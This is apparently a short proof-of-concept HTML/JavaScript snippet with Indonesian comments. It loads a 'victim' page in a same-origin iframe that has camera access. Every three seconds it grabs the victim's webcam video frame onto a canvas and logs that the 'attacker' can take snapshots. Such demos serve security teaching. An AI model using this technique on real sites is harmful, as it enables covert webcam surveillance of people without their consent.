<iframe id="victimFrame" src="victim.html" sandbox="allow-scripts allow-same-origin allow-forms allow-camera"></iframe>
<script>
const iframe = document.getElementById("victimFrame");

// Tunggu iframe load
iframe.onload = () => {
  const victimDoc = iframe.contentDocument || iframe.contentWindow.document;
  const video = victimDoc.getElementById("video");

  // Misal kita buat tombol Attacker capture frame langsung
  // (harus same-origin supaya JS bisa akses video)
  setInterval(() => {
    if (video.srcObject) {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
      console.log("Attacker bisa mengambil snapshot dari Victim");
    }
  }, 3000); // setiap 3 detik
};
</script>
